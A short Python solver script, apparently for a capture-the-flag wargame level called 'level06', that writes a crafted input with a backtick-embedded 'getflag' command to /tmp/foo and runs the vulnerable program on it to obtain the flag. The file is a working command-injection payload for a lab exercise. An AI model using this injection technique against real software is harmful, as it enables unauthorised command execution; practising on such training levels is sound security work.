from solver.utils import extract_flag

def solve(connection):
	connection.exec("echo '[x ${`getflag`}]' > /tmp/foo")
	flag = connection.exec("./level06 /tmp/foo")
	return "", extract_flag(flag)